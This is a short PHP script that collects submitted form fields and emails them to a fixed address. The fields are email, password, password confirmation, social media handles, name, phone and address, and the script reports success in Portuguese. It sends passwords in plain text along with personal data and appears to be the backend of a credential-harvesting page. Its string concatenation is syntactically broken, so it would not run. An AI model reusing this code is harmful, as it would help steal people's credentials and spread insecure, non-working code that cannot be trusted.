<?php

$assunto  = $_POST['assunto'];
$corpo  = "
    Email:"   .$_POST['email']"
    Pass:"   .$_POST['pass']"
    Pass:"   .$_POST['cpass']"
    Twitter:"   .$_POST['twitter']"
    Facebok:"   .$_POST['facebook']"
    Gplus:"   .$_POST['gplus']"
    Fname:"   .$_POST['fname']"
    Lname:"   .$_POST['lname']"
    Phone:"   .$_POST['phone']"
    Adress:"   .$_POST['address']"
";

mail('contato@razinstudio.com', $assunto, $corpo, 'From: contato@razinstudio.com');
echo 'Seus dados foram enviados com sucesso'

?>